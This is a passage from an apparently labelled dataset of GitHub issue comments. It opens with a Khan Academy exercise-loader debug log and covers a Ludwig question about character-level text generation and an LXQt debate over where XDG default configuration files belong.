fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) validator created MathJax done typesetting (\large(0,\ ) MathJax done typesetting (\large)) loading and rendering solving_for_the_y-intercept loaded solving_for_the_y-intercept, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for solving_for_the_y-intercept cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (-6x + 5y = -15) MathJax done typesetting (y) MathJax done typesetting (\large(0,\ ) MathJax done typesetting (\large)) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\large(0,\ ) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\large)) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) validator created MathJax done typesetting (\large(0,\ ) MathJax done typesetting (\large)) loading and rendering solving_for_the_y-intercept loaded solving_for_the_y-intercept, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for solving_for_the_y-intercept cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting ((10, -5)) MathJax done typesetting (y = -\dfrac{5}{3} x + b) MathJax done typesetting (y) MathJax done typesetting (b) MathJax done typesetting (b =) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (b =) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) validator created MathJax done typesetting (b =) loading and rendering solving_for_the_y-intercept loaded solving_for_the_y-intercept, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for solving_for_the_y-intercept cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting ((9, -7)) MathJax done typesetting (y = -\dfrac{1}{3} x + b) MathJax done typesetting (y) MathJax done typesetting (b) MathJax done typesetting (b =) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (b =) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) validator created MathJax done typesetting (b =) startTask... startTask got task undefined startTask... startTask got task undefined loadExercise start number_line.html loadExercise start comparing_fractions_1.html loading and rendering recognizing_conic_sections loadExercise start recognizing_conic_sections.html loadExercise got comparing_fractions_1.html loadExercise submod math loadExercise submod graphie loadExercise submod graphie-helpers loadModule mod /khan-exercises/utils/graphie-helpers.js loadExercise submod word-problems loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish comparing_fractions_1.html loadExercise got number_line.html loadExercise submod math loadExercise submod graphie loadExercise submod word-problems loadExercise submod interactive loadModule mod /khan-exercises/utils/interactive.js loadModule mod /khan-exercises/utils/jquery.mobile.vmouse.js loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish number_line.html loadExercise got recognizing_conic_sections.html loadExercise submod math loadExercise submod math-format loadExercise submod graphie loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish recognizing_conic_sections.html loaded recognizing_conic_sections, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for recognizing_conic_sections cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) running graphie ran graphie done with runModules decided on answer type radio (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) running graphie ran graphie validator created loadExercise start dividing_fractions_word_problems.html loading and rendering number_line loaded number_line, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for number_line cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) running word-problemsLoad ran word-problemsLoad (interactiveLoad not a fn; src undefined) (jquery.mobile.vmouseLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (24) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie MathJax done typesetting (0) MathJax done typesetting (4) ran graphie (word-problems not a fn; src undefined) (interactive not a fn; src undefined) (jquery.mobile.vmouse not a fn; src undefined) done with runModules decided on answer type custom (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (word-problems not a fn; src undefined) (interactive not a fn; src undefined) (jquery.mobile.vmouse not a fn; src undefined) validator created loadExercise got dividing_fractions_word_problems.html loadExercise submod math loadExercise submod math-format loadExercise submod word-problems loadExercise submod spin loadModule mod /khan-exercises/utils/spin.js loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish dividing_fractions_word_problems.html loadExercise start graphing_points.html loading and rendering comparing_fractions_1 loaded comparing_fractions_1, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (interactiveCleanup not a fn; src undefined) (jquery.mobile.vmouseCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (interactiveCleanup not a fn; src undefined) (jquery.mobile.vmouseCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for comparing_fractions_1 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) (graphie-helpersLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) running word-problemsLoad ran word-problemsLoad done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\dfrac{11}{14}) MathJax done typesetting (\dfrac{11}{12}) MathJax done typesetting (&lt;) MathJax done typesetting (&lt;) MathJax done typesetting (&gt;) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (graphie-helpers not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) (word-problems not a fn; src undefined) done with runModules decided on answer type radio (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (&lt;) MathJax done typesetting (&gt;) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (graphie-helpers not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) (word-problems not a fn; src undefined) validator created MathJax done typesetting (&lt;) MathJax done typesetting (&gt;) loadExercise got graphing_points.html loadExercise submod math loadExercise submod interactive loadExercise submod graphie loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish graphing_points.html loading and rendering dividing_fractions_word_problems loaded dividing_fractions_word_problems, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (graphie-helpersCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (graphie-helpersCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for dividing_fractions_word_problems cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) running word-problemsLoad ran word-problemsLoad (spinLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\frac{1}{8}) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) (word-problems not a fn; src undefined) running spin ran spin done with runModules decided on answer type number validator created ",False,True,False,khan-exercises/Khan/80851
ludwig/uber/184/470746789,"I'm sorry, I found the transformer plans in FAQ. However, I can't find a sequence of character generation example on the list of examples. I'm looking for a way to do what char-rnn does with Shakespeare text but with Ludwig. Care to help me? ",False,True,False,ludwig/uber/184
ludwig/uber/184/470767314,Use a text feature and set  ;) In the docs text feature ,False,True,False,ludwig/uber/184
ludwig/uber/184/471023729,you have to respect Ludwig's data format. READ THE DOCS. ,False,True,False,ludwig/uber/184
ludwig/uber/184/471023065,"I have input file called shakespeare.csv of 1mb with First Citizen Before we proceed any further, hear me speak. All Speak, speak. First Citizen You are all resolved rather to die than to famish? All Resolved. resolved. First Citizen First, you know Caius Marcius is chief enemy to the people. All We know't, we know't. ... I have test.yaml with input_features name shakespeare     type text     encoder rnn     cell lstm     bidirectional true     level char  output_features name shakespeare     type text  I use ludwig experiment --data_csv shakespeare.csv --model_definition_file test.yaml butain it doesn't train, gives me ""TypeError 'int' object is not callable"". I suspect there are some things I'm doing wrong, I want to generate new text in the style of Shakespeare. If you know how to do it please tell me so I can do it. Thanks. ",False,True,False,ludwig/uber/184
ludwig/uber/184/471082186,@friend this entitled and abusive attitude is not constructive and will not get you any help from anyone. ,False,True,False,ludwig/uber/184
ludwig/uber/184/471032466,"I have read the damn docs! They are obviously not clear enough, at least on my problem. Being Ludwig promoted as easy to implement as it is, I was expecting a little quick help instead of just saying read the docs like a robot. For now I'll wait until Uber hires someone who can respond to my questions properly. ",True,True,False,ludwig/uber/184
lxqt/lxqt/1628/441120517,"So - where is the problem? If Gentoo thinks that it is a cool idea to leave out these directories there are two choices Fix the xdg dirs or the place where configurations are located. And no, we will not change a bit. Our configurations are meant to be loaded or as a suggestion if a distribution want to place their own things in places like /etc/xdg or /etc - closing this as pure downstream bug. ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441121010,"btw - ubuntu has the same ""problem"" - hard overriding the xdg-upstream defaults and complaining about the same - they decided to set the xdg path in the session - but thats not the way we will go as upstream. ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441132261,We had this discussion before.     the needed things to fix that issue downstream are mentioned there. So there are a lot of possible solutions. Just chose one that will fit best. ,False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441150980,"Do we know how KDE handles it? I don't know much about these things but I think, sometimes, it's good to know how KDE deals with problems we encounter (although this may not be our problem). ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441141840,"After reading in lxqt/lxqt-session#126 again it might be that i was far to optimistic about distributions. But the original problem remains What if the chosen distribution preset was really well thought and we paint it over? (Don't know much about NixOS and such things, but ...) Just played a bit in Arch  to so maybe we should set '/usr/share/' here too - i'm not happy about, but - if so, we also should review #126 again. At least this would solve the Gentoo and the Lubuntu problems without the need for them to change anything. Second thought - if we activate this, whats about some cmake magic like -DXDG_FOO=""$BAR"" ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441252244,"afaik KDE use /etc/xdg and such things - and with my distribution and derivative maintainer hat on I'm not exactly happy about. There are some ways to make distribution- and derivative maintainers happy. One way is to provide config dirs instead of config files - like in /tec/profile.d or so. The other way is go out of their way as much as we can - ok, didn't work well with our move to /usr/share until now i guess. ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441122972,"And which linux distribution is setting it ""right"" then? According to latest xdg spec It is incorrect to assume that you'd get more than just /etc/xdg from $XDG_CONFIG_DIRS. That's the problem. And QSettings (in recent Qt versions) is using by default $XDG_CONFIG_DIRS + $XDG_CONFIG_HOME. It even states so in documentation. And $XDG_CONFIG_HOME by default points to $HOME/.config. For  you have to use $XDG_DATA_DIRS variable, and it is not used by lxqt to look for configs. Btw, as I pointed in first post, one of packages,  installs configs correctly. All other packages install it incorrectly. Or other way around. Since they're installing configs inconsistently, some of them might be doing it incorrectly. I understand the point about overriding default configs from package at  by vendor-specific config at , the issue is that by default code just ignores . ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/383654351,"   Expected Behavior   When lxqt is started first time, if no user config exists, it should load default config. Current Behavior   Default config is installed but not found. I've tried running lxqt-panel since it's noticeably empty when no default config is found. Config for lxqt-panel is installed to . I've tried running it under strace and confirmed that lxqt-panel only tries searching config at  and  for me. Possible Solution   Either configs could be searched for in  directory or configs could be moved to . Steps to Reproduce (for bugs)    logout from graphical session backup your lxqt configs and move or delete them. I move out directory ""~/.config/lxqt"" and all it's contents. start graphical lxqt session  Context   As I already mentioned, lxqt doesn't find most of configs on first launch and starts without any configs applied and looking very ugly and hardly useable. Relevant parts of my env One of packages, , install it's config as . Other packages install configs to  directory, including/usr/share/lxqt/panel.conflxqt-panel for /usr/share/lxqt/windowmanagers.conflxqt-session` System Information   Distribution &amp; Version Gentoo Linux amd64 Kernel 4.14.78-gentoo Qt Version 5.11.1 liblxqt Version 0.13.0 Package version lxqt-panel-0.13.0, same for other packages  ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441132875,One addition - had a bug filed today in debian against pcmanfm-qt  Don't patch things if a configuration file in a common place is sufficient. ,False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441437313,"Quite the opposite... Anyhow, an app that has problem with  should have a bug. ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441282467,"yeah - the last and the upcoming release are the ""bad"" releases for maintainers sunglasses 0.13.0 with the  common and config moves, 0.14.0 with the language package moves. Both things remove(d) many dead corpses that was hidden in our basement. I want to stay with the configs in /usr/share too - the ability to handle things like   without patching is a really great. ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441437645,"Could you please name some such distributions which add  to $XDG_CONFIG_DIRS outside of LXQt session? Because LXQt contains a hack to add it explicitly if $XDG_CONFIG_DIRS wasn't set. I really want to check it out. I'd prefer more mainstream distributions, if that's possible. Well, loading example configs is not a bug, but it is an issue when application would unexpectedly load them, because application installed example configs to $XDG_DATA_DIRS, not $XDG_CONFIG_DIRS. In my opinion those two are separate entities which are better to be kept separate. Otherwise, why did standard make them separate? ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441439219,"BTW, this issue is still open. ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441440237,"A real-world example? I ask because I don't remember I've encountered this ambiguity anywhere; otherwise, what you said sounds logical. ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441439350,I've edited comment to clarify that I meant issue 1369 being closed if that's what confused you. ,False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441436750,"Thanks for the links. I'll comment on all of it here to keep discussion in one place. From this comment That answers my question about linux distributions adding  to $XDG_CONFIG_DIRS most likely there are no such distributions. But in some cases you have this variable not set, and while this is a valid case, in this case you add a hack, you are adding value  to this variable in addition to otherwise more or less sane value of this variable. And this is actually a hack, because you add it not only to lxqt-based applications, you add this value to $XDG_CONFIG_DIRS for all applications in session which might eventually lead to some errors. Yeah, it probably doesn't cause issues at the moment, but it doesn't make this solution less of a hack. Imagine if a third-party application looks for configs in $XDG_CONFIG_DIRS and then it finds and tries to use example configs in , which is $XDG_DATA_DIRS, not $XDG_CONFIG_DIRS on sane setups. And this is not a downstream issue when you hack env variables for your specific cases. From this comment from issue 1521 That is actually funny, because link doesn't prove your words. If you read it, it actually does opposite. See my second post in this issue. From this comment from pull 126 And there's one more case variable was set to a default value, and your software breaks when it's set to default value. And this comment from pull 126 Emphasis is mine. That's some low expectation here. I expect that DE is useable on initial launch. I've seen a few different ones, including gnome-2, gnome-3, unity, enlightenment-17, kde-3, kde-4, kde-5, razor-qt, xfce-4, probably some others I forgot, and none of them started with (quote) . Earlier versions of LXQt too, btw. If I wouldn't have seen LXQt working before, I am as user would consider it being very buggy pre-alpha version of software not suitable for use yet, I'd have killed it and uninstalled. Distributions actually use  as XDG dirs, but they use it as $XDG_DATA_DIRS, not as $XDG_CONFIG_DIRS, and they do so by following the standard. Issue is that you don't load any initial configs in a valid environment. I didn't move or delete configs your software by default installs in . You just never use those configs if somehow $XDG_CONFIG_DIRS was set to a value not containing , which default value for $XDG_CONFIG_DIRS actually does not contain. About issue 1369 I don't know why this issue 1369 is closed, because current behaviour still ignores  and . Well, adding  to $XDG_CONFIG_DIRS sounds okay to me, but not . It's part of $XDG_DATA_DIRS. And I don't think QSettings is appropriate place to look for files in all those places. You might need to implement a separate logic to look for a config file in all of those places with respect to standard and env variables. And I'd add one more point to those 4 if all 4 fail, consider using some built-in initial config similar to config kept at  as final fallback. It'd be much better than this initial black screen. EDIT clarified that I meant issue 1369 being closed. ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441439183,"Oh, my bad! I was thinking about the default value of , which wasn't what you meant. You're right. ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441440808,"the real problem is - if config dirs is not set or empty - all things are fine, we set it with our settings. only in case it is set before the session jumps in there are indeed problems if set only to /etc/xdg. So we have two choices  do nothing in such cases extend it  I would go with the second option, but make this 'hack' optional - should not be rocket science. As i wrote sometime - we should go out of the way distributions works and leave all things open to them - maybe with a bit default 'help' from our side that can be configured. ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441263141,Probably most distributions ship default configs. And the ones that change things used to patch the default configs for years and it was no problem. Personally I still prefer this approach to having configs in /usr/share. One could argue that having to patch them is even good since it could be that the patch doesn't apply anymore because of new options and so the maintainer gets aware of this and adjusts the file. If he still ships the distro specific thing without checking it could mean that some important things are left out or not udpated. I agree that we should decide on some things and let them stay the way they are for a longer period of time. Recently we had in every release big changes I think (seperate language package..) ,False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441440395,"Sorry, I don't have real world examples. That's exactly why I wrote (quote) ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441440874,"Sorry, I should have read your long comment more carefully. So, the problem in question is possible but not probable. That reminds me of Murphy's law. @friend ? ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441441320,"One could see it as Murphy - It is not important which way you chose, you will lose ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441441848,"Practically, even if that problem happens -- and even if it has a high probability -- nothing disastrous will happen. But it was a good point I hadn't thought about. ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441442128,"I've added emphasis to actual real problem . They are not following standards.  in $XDG_CONFIG_DIRS isn't standard. Well, you'll create another issue where will you store this setting? ) Well, if you make following implementation, how do you lose? Quote from my previous message about possible implementation where  mean ",False,True,False,lxqt/lxqt/1628
